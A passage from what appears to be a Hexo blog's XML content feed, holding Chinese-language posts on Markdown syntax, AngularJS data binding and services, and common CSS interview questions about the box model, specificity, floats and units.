href="#补充：当然从斜体我们也能思考得出加粗的另一种示例" class="headerlink" title="补充：当然从斜体我们也能思考得出加粗的另一种示例"></a>补充：当然从斜体我们也能思考得出加粗的另一种示例</h4><p>加粗示例：<strong>这里是加粗</strong><br>加粗示例：<strong>这里是加粗</strong></p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p>表格是我觉得 Markdown 比较累人的地方，例子如下：</p><table><thead><tr><th>Tables</th><th style="text-align:center">Are</th><th style="text-align:right">Cool</th></tr></thead><tbody><tr><td>col 3 is</td><td style="text-align:center">right-aligned</td><td style="text-align:right">$1600</td></tr><tr><td>col 2 is</td><td style="text-align:center">centered</td><td style="text-align:right">$12</td></tr><tr><td>zebra stripes</td><td style="text-align:center">are neat</td><td style="text-align:right">$1</td></tr></tbody></table><p>这种语法生成的表格如下：</p><p>Tables        Are        Cool</p><p>col 3 is    right-aligned    $1600<br>col 2 is    centered    $12<br>zebra stripes    are neat    $1</p><h3 id="代码框"><a href="#代码框" class="headerlink" title="代码框"></a>代码框</h3><p>如果你是个程序猿，需要在文章里优雅的引用代码框，在 Markdown下实现也非常简单，只需要用两个 ` 把中间的代码包裹起来。图例：</p><p><code><a href="www.baidu.com">article</a></code></p><p>使用 tab 键即可缩进。当用到大片的代码的时候需要使用tab加四个空格</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre><code>`<html><table border="1" cellpadding="10">    <tr>        <td>row1 cell1</td>        <td>row1 cell2</td>    </tr>    <tr>        <td>&nbsp</td>        <td>row2 cell2</td>    </tr>    <tr></table></html>`        </code></pre><h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><p>分割线的语法只需要三个 * 号，例如：</p><p>到这里，Markdown 的基本语法在日常的使用中基本就没什么大问题了，只要多加练习，配合好用的工具，写起东西来肯定会行云流水。更多的语法规则，其实 Mou 的 Help 文档栗子很好，当你第一次使用 Mou 时，就会显示该文档。可以用来对用的查找和学习。</p><h3 id="引用-1"><a href="#引用-1" class="headerlink" title="引用"></a>引用</h3><p>当我写一段话的时候我先在底部标注一下［1］的链接是什么意思的时候，再次撰写的时候就可以直接在需要链接的部分添加［1］即可：<br>演示如下：<br>这是链接<a href="http://www.baidu.com/" title="baidu" target="_blank" rel="noopener">百度</a> 这是<a href="http://google.com/" title="google" target="_blank" rel="noopener">谷歌</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AngularJs简述</title>
      <link href="/2018/05/06/AngularJs/"/>
      <url>/2018/05/06/AngularJs/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="Angular-的数据绑定采用什么机制？详述原理"><a href="#Angular-的数据绑定采用什么机制？详述原理" class="headerlink" title="Angular 的数据绑定采用什么机制？详述原理"></a>Angular 的数据绑定采用什么机制？详述原理</h3><p>脏检查机制。</p><p>双向数据绑定是 AngularJS 的核心机制之一。当 view 中有任何数据变化时，会更新到 model ，当 model 中数据有变化时，view 也会同步更新，显然，这需要一个监控。</p><p>原理就是，Angular 在 scope 模型上设置了一个 监听队列，用来监听数据变化并更新 view 。每次绑定一个东西到 view 上时 AngularJS 就会往 $watch 队列里插入一条 $watch，用来检测它监视的 model 里是否有变化的东西。当浏览器接收到可以被 angular context 处理的事件时，$digest 循环就会触发，遍历所有的 $watch，最后更新 dom。</p><p>举个栗子</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><button ng-click="val=val+1">increase 1</button></span><br></pre></td></tr></tbody></table></figure><p>click 时会产生一次更新的操作（至少触发两次 $digest 循环）</p><p>按下按钮<br>浏览器接收到一个事件，进入到 angular context<br>$digest 循环开始执行，查询每个 $watch 是否变化<br>由于监视 $scope.val 的 $watch 报告了变化，因此强制再执行一次 $digest 循环<br>新的 $digest 循环未检测到变化<br>浏览器拿回控制器，更新 $scope.val 新值对应的 dom<br>$digest 循环的上限是 10 次（超过 10次后抛出一个异常，防止无限循环）。</p><h3 id="factory、service-和-provider-是什么关系？"><a href="#factory、service-和-provider-是什么关系？" class="headerlink" title="factory、service 和 provider 是什么关系？"></a>factory、service 和 provider 是什么关系？</h3><p>factory</p><p>把 service 的方法和数据放在一个对象里，并返回这个对象</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.factory('FooService', function(){</span><br><span class="line">    return {</span><br><span class="line">        target: 'factory',</span><br><span class="line">        sayHello: function(){</span><br><span class="line">            return 'hello ' + this.target;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>service</p><p>通过构造函数方式创建 service，返回一个实例化对象</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.service('FooService', function(){</span><br><span class="line">    var self = this;</span><br><span class="line">    this.target = 'service';</span><br><span class="line">    this.sayHello = function(){</span><br><span class="line">        return 'hello ' + self.target;</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>provider</p><p>创建一个可通过 config 配置的 service，$get 中返回的，就是用 factory 创建 service 的内容</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.provider('FooService', function(){</span><br><span class="line">    this.configData = 'init data';</span><br><span class="line">    this.setConfigData = function(data){</span><br><span class="line">        if(data){</span><br><span class="line">            this.configData = data;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    this.$get = function(){</span><br><span class="line">        var self = this;</span><br><span class="line">        return {</span><br><span class="line">            target: 'provider',</span><br><span class="line">            sayHello: function(){</span><br><span class="line">                return self.configData + ' hello ' + this.target;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">// 此处注入的是 FooService 的 provider</span><br><span class="line">app.config(function(FooServiceProvider){</span><br><span class="line">    FooServiceProvider.setConfigData('config data');</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>从底层实现上来看，service 调用了 factory，返回其实例；factory 调用了 provider，返回其 $get 中定义的内容。factory 和 service 功能类似，只不过 factory 是普通 function，可以返回任何东西（return 的都可以被访问，所以那些私有变量怎么写，你懂的）；service 是构造器，可以不返回（绑定到 this 的都可以被访问）；provider 是加强版 factory，返回一个可配置的 factory。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AngularJs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS面试</title>
      <link href="/2018/05/06/CSS%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2018/05/06/CSS%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="解释一下CSS的盒子模型？"><a href="#解释一下CSS的盒子模型？" class="headerlink" title="解释一下CSS的盒子模型？"></a>解释一下CSS的盒子模型？</h3><p>盒子模型也有人称为框模型，HTML中的多数元素都会在浏览器中生成一个矩形的区域，每个区域包含四个组成部分，从外向内依次是：外边距（Margin）、边框（Border）、内边距（Padding）和内容（Content），其实盒子模型有两种，分别是 ie 盒子模型和标准 w3c 盒子模型，加上了doctype声明，让所有浏览器都会采用标准 w3c 盒子模型去解释你的盒子。</p><h3 id="请你说说CSS选择器的类型有哪些，并举几个例子说明其用法？"><a href="#请你说说CSS选择器的类型有哪些，并举几个例子说明其用法？" class="headerlink" title="请你说说CSS选择器的类型有哪些，并举几个例子说明其用法？"></a>请你说说CSS选择器的类型有哪些，并举几个例子说明其用法？</h3><p>类型：基础的选择器、组合选择器、属性选择器、伪类、伪元素</p><p>基础的选择器</p><p><img src="https://uploadfiles.nowcoder.com/images/20170112/826546_1484210276027_BA78E82E32EE281BB497E5A95AD45131" alt="image"></p><p>组合选择器</p><p><img src="https://uploadfiles.nowcoder.com/images/20170112/826546_1484210347177_FB657AED5DB382900D8CB9B4C0EE94CC" alt="image"></p><p>属性选择器</p><p><img src="https://uploadfiles.nowcoder.com/images/20170112/826546_1484210392815_CE00F721E20BCF39E6A71F0A41ED97AE" alt="image"></p><p>伪类</p><p><img src="https://uploadfiles.nowcoder.com/images/20170112/826546_1484210432911_8DD714A923F2BB143F4F09699A2A1C5A" alt="image"></p><p>伪元素</p><p><img src="https://uploadfiles.nowcoder.com/images/20170112/826546_1484210469704_FBC0298AFBF632515B83E535B2BD9881" alt="image"></p><h3 id="请你说说CSS有什么特殊性-（优先级、计算特殊值"><a href="#请你说说CSS有什么特殊性-（优先级、计算特殊值" class="headerlink" title="请你说说CSS有什么特殊性?（优先级、计算特殊值"></a>请你说说CSS有什么特殊性?（优先级、计算特殊值</h3><p>优先级</p><ul><li>同类型，同级别的样式后者先于前者</li><li>ID > 类样式 > 标签 > *</li><li>内联>ID选择器>伪类>属性选择器>类选择器>标签选择器>通用选择器(*)>继承的样式</li><li>具体 > 泛化的，特殊性即css优先级</li><li>近的 > 远的 (内嵌样式 > 内部样式表 > 外联样式表)</li><li>内嵌样式：内嵌在元素中，<span style="color:red">span</span></li><li>内部样式表：在页面中的样式，写在<style></style>中的样式</li><li>外联样式表：单独存在一个css文件中，通过link引入或import导入的样式</li><li>!important 权重最高，比 inline style 还要高</li></ul><p>计算特殊性值</p><p>important > 内嵌 > ID > 类 > 标签 | 伪类 | 属性选择 > 伪对象 > 继承 > 通配符<br>权重、特殊性计算法：</p><p>CSS样式选择器分为4个等级，a、b、c、d</p><ul><li>如果样式是行内样式（通过Style=“”定义），那么a=1，1,0,0,0 </li><li>b为ID选择器的总数 0,1,0,0 </li><li>为属性选择器，伪类选择器和class类选择器的数量。0,0,1,0</li><li>d为标签、伪元素选择器的数量 0,0,0,1</li><li>!important 权重最高，比 inline style 还要高</li></ul><p>比如结果为：1093比1100，按位比较，从左到右，只要一位高于则立即胜出，否则继续比较。<br><img src="https://uploadfiles.nowcoder.com/images/20170112/826546_1484205594968_4ED92BEADCE36C6C43A64E7E23B3144E" alt="image"></p><h3 id="要动态改变层中内容可以使用的方法？"><a href="#要动态改变层中内容可以使用的方法？" class="headerlink" title="要动态改变层中内容可以使用的方法？"></a>要动态改变层中内容可以使用的方法？</h3><p>innerHTML，innerText</p><h3 id="常见浏览器兼容性问题与解决方案？"><a href="#常见浏览器兼容性问题与解决方案？" class="headerlink" title="常见浏览器兼容性问题与解决方案？"></a>常见浏览器兼容性问题与解决方案？</h3><p>(1)浏览器兼容问题一：不同浏览器的标签默认的外补丁和内补丁不同 </p><ul><li>问题症状：随便写几个标签，不加样式控制的情况下，各自的margin 和padding差异较大。</li><li>碰到频率:100%</li><li>解决方案：CSS里 *{margin:0;padding:0;}</li><li>备注：这个是最常见的也是最易解决的一个浏览器兼容性问题，几乎所有的CSS文件开头都会用通配符*来设置各个标签的内外补丁是0。</li></ul><p>(2)浏览器兼容问题二：块属性标签float后，又有横行的margin情况下，在IE6显示margin比设置的大 </p><ul><li>问题症状:常见症状是IE6中后面的一块被顶到下一行</li><li>碰到频率：90%（稍微复杂点的页面都会碰到，float布局最常见的浏览器兼容问题）</li><li>解决方案：在float的标签样式控制中加入 display:inline;将其转化为行内属性</li><li>备注：我们最常用的就是div+CSS布局了，而div就是一个典型的块属性标签，横向布局的时候我们通常都是用div float实现的，横向的间距设置如果用margin实现，这就是一个必然会碰到的兼容性问题。</li></ul><p>(3)浏览器兼容问题三：设置较小高度标签（一般小于10px），在IE6，IE7，遨游中高度超出自己设置高度 </p><ul><li>问题症状：IE6、7和遨游里这个标签的高度不受控制，超出自己设置的高度</li><li>碰到频率：60%</li><li>解决方案：给超出高度的标签设置overflow:hidden;或者设置行高line-height 小于你设置的高度。</li><li>备注：这种情况一般出现在我们设置小圆角背景的标签里。出现这个问题的原因是IE8之前的浏览器都会给标签一个最小默认的行高的高度。即使你的标签是空的，这个标签的高度还是会达到默认的行高。</li></ul><p>(4)浏览器兼容问题四：行内属性标签，设置display:block后采用float布局，又有横行的margin的情况，IE6间距bug </p><ul><li>问题症状：IE6里的间距比超过设置的间距</li><li>碰到几率：20%</li><li>解决方案 ： 在display:block;后面加入display:inline;display:table;</li><li>备注：行内属性标签，为了设置宽高，我们需要设置display:block;(除了input标签比较特殊)。在用float布局并有横向的margin后，在IE6下，他就具有了块属性float后的横向margin的bug。不过因为它本身就是行内属性标签，所以我们再加上display:inline的话，它的高宽就不可设了。这时候我们还需要在display:inline后面加入display:talbe。</li></ul><p>(5) 浏览器兼容问题五：图片默认有间距 </p><ul><li>问题症状：几个img标签放在一起的时候，有些浏览器会有默认的间距，加了问题一中提到的通配符也不起作用。</li><li>碰到几率：20%</li><li>解决方案：使用float属性为img布局</li><li>备注 ： 因为img标签是行内属性标签，所以只要不超出容器宽度，img标签都会排在一行里，但是部分浏览器的img标签之间会有个间距。去掉这个间距使用float是正道。（我的一个学生使用负margin，虽然能解决，但负margin本身就是容易引起浏览器兼容问题的用法，所以我禁止他们使用）</li></ul><p>(6) 浏览器兼容问题六：标签最低高度设置min-height不兼容 </p><ul><li>问题症状：因为min-height本身就是一个不兼容的CSS属性，所以设置min-height时不能很好的被各个浏览器兼容</li><li>碰到几率：5%</li><li>解决方案：如果我们要设置一个标签的最小高度200px，需要进行的设置为：{min-height:200px; height:auto !important; height:200px; overflow:visible;}</li><li>备注：在B/S系统前端开时，有很多情况下我们又这种需求。当内容小于一个值（如300px）时。容器的高度为300px；当内容高度大于这个值时，容器高度被撑高，而不是出现滚动条。这时候我们就会面临这个兼容性问题。</li></ul><p>(7)浏览器兼容问题七：透明度的兼容CSS设置 </p><ul><li>一般在ie中用的是filter:alpha(opacity=0);这个属性来设置div或者是块级元素的透明度，而在firefox中，一般就是直接使用opacity:0,对于兼容的，一般的做法就是在书写css样式的将2个都写上就行，就能实现兼容</li></ul><h3 id="列出display的值并说明他们的作用？"><a href="#列出display的值并说明他们的作用？" class="headerlink" title="列出display的值并说明他们的作用？"></a>列出display的值并说明他们的作用？</h3><p>display： none | inline | block | list-item | inline-block | table | inline-table | table-caption | table-cell | table-row | table-row-group | table-column | table-column-group | table-footer-group | table-header-group | run-in | box | inline-box | flexbox | inline-flexbox | flex | inline-flex</p><ul><li>默认值：inline</li><li>none： 隐藏对象。与visibility属性的hidden值不同，其不为被隐藏的对象保留其物理空间 </li><li>inline： 指定对象为内联元素。 </li><li>block： 指定对象为块元素。 </li><li>list-item： 指定对象为列表项目。 </li><li>inline-block： 指定对象为内联块元素。（CSS2） </li><li>table： 指定对象作为块元素级的表格。类同于html标签（CSS2） <table></table></li><li>inline-table： 指定对象作为内联元素级的表格。类同于html标签（CSS2） <table></table></li><li>table-caption： 指定对象作为表格标题。类同于html标签（CSS2） </li><li>table-cell： 指定对象作为表格单元格。类同于html标签（CSS2） </li><li>table-row： 指定对象作为表格行。类同于html标签（CSS2） </li><li>table-row-group： 指定对象作为表格行组。类同于html标签（CSS2） </li><li>table-column： 指定对象作为表格列。类同于html标签（CSS2） </li><li>table-column-group： 指定对象作为表格列组显示。类同于html标签（CSS2） </li><li>table-header-group： 指定对象作为表格标题组。类同于html标签（CSS2） </li><li>table-footer-group： 指定对象作为表格脚注组。类同于html标签（CSS2） </li><li>run-in： 根据上下文决定对象是内联对象还是块级对象。（CSS3） </li><li>box： 将对象作为弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） </li><li>inline-box： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） </li><li>flexbox： 将对象作为弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） </li><li>inline-flexbox： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） </li><li>flex： 将对象作为弹性伸缩盒显示。（伸缩盒最新版本）（CSS3） </li><li>inline-flex： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最新版本）（C</li></ul><h3 id="如何居中div-如何居中一个浮动元素"><a href="#如何居中div-如何居中一个浮动元素" class="headerlink" title="如何居中div, 如何居中一个浮动元素?"></a>如何居中div, 如何居中一个浮动元素?</h3><ul><li>非浮动元素居中：可以设置 margin:0 auto 令其居中, 定位 ,父级元素text-algin:center等等</li><li>浮动元素居中: <ul><li>方法一:设置当前div的宽度，然后设置margin-left:50%; position:relative; left:-250px;其中的left是宽度的一半。</li><li>方法二:父元素和子元素同时左浮动，然后父元素相对左移动50%，再然后子元素相对左移动-50%。</li><li>方法三:position定位等等。</li></ul></li></ul><h3 id="CSS中-link-和-import-的区别是？"><a href="#CSS中-link-和-import-的区别是？" class="headerlink" title="CSS中 link 和@import 的区别是？"></a>CSS中 link 和@import 的区别是？</h3><ul><li>link属于HTML标签，而@import是CSS提供的; </li><li>页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;</li><li>@import只在IE5以上才能识别，而link是HTML标签，无兼容问题;</li><li>link方式的样式的权重 高于@import的权重.</li></ul><h3 id="请列举几种清除浮动的方法-至少两种"><a href="#请列举几种清除浮动的方法-至少两种" class="headerlink" title="请列举几种清除浮动的方法(至少两种)?"></a>请列举几种清除浮动的方法(至少两种)?</h3><ul><li>父级div定义 height <ul><li>原理：父级div手动定义height，就解决了父级div无法自动获取到高度的问题。 </li><li>优点：简单、代码少、容易掌握 </li><li>缺点：只适合高度固定的布局，要给出精确的高度，如果高度和父级div不一样时，会产生问题 </li><li>建议：不推荐使用，只建议高度固定的布局时使用 </li></ul></li><li>结尾处加空div标签 clear:both <ul><li>原理：添加一个空div，利用css提高的clear:both清除浮动，让父级div能自动获取到高度 </li><li>优点：简单、代码少、浏览器支持好、不容易出现怪问题 </li><li>缺点：不少初学者不理解原理；如果页面浮动布局多，就要增加很多空div，让人感觉很不好 </li><li>建议：不推荐使用，但此方法是以前主要使用的一种清除浮动方法 </li></ul></li><li>父级div定义 伪类:after 和 zoom <ul><li>原理：IE8以上和非IE浏览器才支持:after，原理和方法2有点类似，zoom(IE转有属性)可解决ie6,ie7浮动问题 </li><li>优点：浏览器支持好、不容易出现怪问题（目前：大型网站都有使用，如：腾迅，网易，新浪等等） </li><li>缺点：代码多、不少初学者不理解原理，要两句代码结合使用才能让主流浏览器都支持。 </li><li>建议：推荐使用，建议定义公共类，以减少CSS代码。</li></ul></li><li>父级div定义 overflow:hidden <ul><li>原理：必须定义width或zoom:1，同时不能定义height，使用overflow:hidden时，浏览器会自动检查浮动区域的高度 </li><li>优点：简单、代码少、浏览器支持好 </li><li>缺点：不能和position配合使用，因为超出的尺寸的会被隐藏。 </li><li>建议：只推荐没有使用position或对overflow:hidden理解比较深的朋友使用。 </li></ul></li><li>父级div定义 overflow:auto <ul><li>原理：必须定义width或zoom:1，同时不能定义height，使用overflow:auto时，浏览器会自动检查浮动区域的高度 </li><li>优点：简单、代码少、浏览器支持好 </li><li>缺点：内部宽高超过父级div时，会出现滚动条。 </li><li>建议：不推荐使用，如果你需要出现滚动条或者确保你的代码不会出现滚动条就使用吧。</li></ul></li></ul><h3 id="block，inline和inlinke-block细节对比？"><a href="#block，inline和inlinke-block细节对比？" class="headerlink" title="block，inline和inlinke-block细节对比？"></a>block，inline和inlinke-block细节对比？</h3><ul><li>display:block <ul><li>block元素会独占一行，多个block元素会各自新起一行。默认情况下，block元素宽度自动填满其父元素宽度。</li><li>block元素可以设置width,height属性。块级元素即使设置了宽度,仍然是独占一行。</li><li>block元素可以设置margin和padding属性。</li></ul></li><li>display:inline <ul><li>inline元素不会独占一行，多个相邻的行内元素会排列在同一行里，直到一行排列不下，才会新换一行，其宽度随元素的内容而变化。</li><li>inline元素设置width,height属性无效。</li><li>inline元素的margin和padding属性，水平方向的padding-left, padding-right, margin-left, margin-right都产生边距效果；但竖直方向的padding-top, padding-bottom, margin-top, margin-bottom不会产生边距效果。</li></ul></li><li>display:inline-block <ul><li>简单来说就是将对象呈现为inline对象，但是对象的内容作为block对象呈现。之后的内联对象会被排列在同一行内。比如我们可以给一个link（a元素）inline-block属性值，使其既具有block的宽度高度特性又具有inline的同行特性。</li></ul></li><li>补充说明 <ul><li>一般我们会用display:block，display:inline或者display:inline-block来调整元素的布局级别，其实display的参数远远不止这三种，仅仅是比较常用而已。</li><li>IE（低版本IE）本来是不支持inline-block的，所以在IE中对内联元素使用display:inline-block，理论上IE是不识别的，但使用display:inline-block在IE下会触发layout，从而使内联元素拥有了display:inline-block属性的表象。</li></ul></li></ul><h3 id="什么叫优雅降级和渐进增强？"><a href="#什么叫优雅降级和渐进增强？" class="headerlink" title="什么叫优雅降级和渐进增强？"></a>什么叫优雅降级和渐进增强？</h3><ul><li>优雅降级： Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。由于IE独特的盒模型布局问题，针对不同版本的IE的hack实践过优雅降级了,为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效.</li><li>渐进增强： 从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。</li></ul><h3 id="说说浮动元素会引起的问题和你的解决办法"><a href="#说说浮动元素会引起的问题和你的解决办法" class="headerlink" title="说说浮动元素会引起的问题和你的解决办法"></a>说说浮动元素会引起的问题和你的解决办法</h3><ul><li>问题： <ul><li>（1）父元素的高度无法被撑开，影响与父元素同级的元素</li><li>（2）与浮动元素同级的非浮动元素会跟随其后</li><li>（3）若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构</li></ul></li><li>解决方法： <ul><li>使用CSS中的clear:both;属性来清除元素的浮动可解决问题(2)、(3)，对于问题(1)，添加如下样式，给父元素添加clearfix样式：<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>{<span class="attribute">content</span>: <span class="string">"."</span>;<span class="attribute">display</span>: block;<span class="attribute">height</span>: <span class="number">0</span>;<span class="attribute">clear</span>: both;<span class="attribute">visibility</span>: hidden;}</span><br><span class="line"><span class="selector-class">.clearfix</span>{<span class="attribute">display</span>: inline-block;} <span class="comment">/* for IE/Mac */</span></span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><h3 id="你有哪些性能优化的方法？"><a href="#你有哪些性能优化的方法？" class="headerlink" title="你有哪些性能优化的方法？"></a>你有哪些性能优化的方法？</h3><ul><li>减少http请求次数：CSS Sprites, JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，图片服务器。</li><li>前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数</li><li>用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能。</li><li>当需要设置的样式很多时设置className而不是直接操作style。</li><li>少用全局变量、缓存DOM节点查找的结果。减少IO读取操作。</li><li>避免使用CSS Expression（css表达式)又称Dynamic properties(动态属性)。</li><li>图片预加载，将样式表放在顶部，将脚本放在底部加上时间戳。</li></ul><h3 id="为什么要初始化CSS样式？"><a href="#为什么要初始化CSS样式？" class="headerlink" title="为什么要初始化CSS样式？"></a>为什么要初始化CSS样式？</h3><p>因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。<br>当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。</p><h3 id="解释下浮动和它的工作原理？清除浮动的技巧？"><a href="#解释下浮动和它的工作原理？清除浮动的技巧？" class="headerlink" title="解释下浮动和它的工作原理？清除浮动的技巧？"></a>解释下浮动和它的工作原理？清除浮动的技巧？</h3><p>浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。 </p><ul><li>使用空标签清除浮动。 <ul><li>这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。</li></ul></li><li>使用overflow。 <ul><li>给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。</li></ul></li><li>使用after伪对象清除浮动。 <ul><li>该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素；</li></ul></li></ul><h3 id="CSS样式表根据所在网页的位置，可分为哪几种样式表？"><a href="#CSS样式表根据所在网页的位置，可分为哪几种样式表？" class="headerlink" title="CSS样式表根据所在网页的位置，可分为哪几种样式表？"></a>CSS样式表根据所在网页的位置，可分为哪几种样式表？</h3><p>行内样式表，内嵌样式表，外部样式表</p><h3 id="谈谈你对CSS中刻度的认识？"><a href="#谈谈你对CSS中刻度的认识？" class="headerlink" title="谈谈你对CSS中刻度的认识？"></a>谈谈你对CSS中刻度的认识？</h3><ul><li>在CSS中刻度是用于设置元素尺寸的单位。 <ul><li>a、特殊值0可以省略单位。例如：margin:0px可以写成margin:0 </li><li>b、一些属性可能允许有负长度值，或者有一定的范围限制。如果不支持负长度值，那应该变换到能够被支持的最近的一个长度值。 </li><li>c、长度单位包括：相对单位和绝对单位。 <ul><li>相对长度单位有： em, ex, ch, rem, vw, vh, vmax, vmin </li><li>绝对长度单位有： cm, mm, q, in, pt, pc, px</li><li>绝对长度单位：1in = 2.54cm = 25.4 mm = 72pt = 6pc = 96px</li><li>文本相对长度单位：em </li></ul></li><li>相对长度单位是相对于当前对象内文本的字体尺寸，如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。(相对父元素的字体大小倍数)</li></ul></li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body { font-size: 14px; }</span><br><span class="line">h1 { font-size: 16px; }</span><br><span class="line">.size1 p { font-size: 1em; }</span><br><span class="line">.size2 p { font-size: 2em; }</span><br><span class="line">.size3 p { font-size: 3em; }</span><br></pre></td></tr></tbody></table></figure><ul><li>文本相对长度单位：rem <ul><li>rem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数</li><li>只相对于根元素的大小 </li></ul></li><li>浏览器的默认字体大小为16像素，浏览器默认样式也称为user agent stylesheet，就是所有浏览器内置的默认样式，多数是可以被修改的，但chrome不能直接修改，可以被用户样式覆盖。</li></ul><h3 id="请你说说em与rem的区别？"><a href="#请你说说em与rem的区别？" class="headerlink" title="请你说说em与rem的区别？"></a>请你说说em与rem的区别？</h3><ul><li>rem <ul><li>rem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数</li><li>只相对于根元素的大小 </li><li>rem（font size of the root element）是指相对于根元素的字体大小的单位。简单的说它就是一个相对单位。</li><li>作用：利用rem可以实现简单的响应式布局，可以利用html元素中字体的大小与屏幕间的比值设置font-size的值实现当屏幕分辨率变化时让元素也变化，以前的天猫tmall就使用这种办法</li></ul></li><li>em <ul><li>文本相对长度单位。相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸(默认16px)。(相对父元素的字体大小倍数)</li><li>em（font size of the element）是指相对于父元素的字体大小的单位。它与rem之间其实很相似，区别在。（相对是的HTML元素的字体大，默认16px）</li></ul></li><li>em与rem的重要区别： 它们计算的规则一个是依赖父元素另一个是依赖根元素计算</li></ul><h3 id="请你说说box-sizing属性的的用法？"><a href="#请你说说box-sizing属性的的用法？" class="headerlink" title="请你说说box-sizing属性的的用法？"></a>请你说说box-sizing属性的的用法？</h3><p>设置或检索对象的盒模型组成模式</p><ul><li>a、box-sizing:content-box： padding和border不被包含在定义的width和height之内。对象的实际宽度等于设置的width值和border、padding之和，即 ( Element width = width + border + padding，但占有页面位置还要加上margin ) 此属性表现为标准模式下的盒模型。</li><li>b、box-sizing:border-box： padding和border被包含在定义的width和height之内。对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度，即 ( Element width = width ) 此属性表现为怪异模式下的盒模型。</li></ul><h3 id="浏览器标准模式和怪异模式之间的区别是什么？"><a href="#浏览器标准模式和怪异模式之间的区别是什么？" class="headerlink" title="浏览器标准模式和怪异模式之间的区别是什么？"></a>浏览器标准模式和怪异模式之间的区别是什么？</h3><p>在“标准模式”(Standards Mode) 页面按照 HTML 与 CSS 的定义渲染，而在“怪异模式”(Quirks Mode)就是浏览器为了兼容很早之前针对旧版本浏览器设计、并未严格遵循 W3C 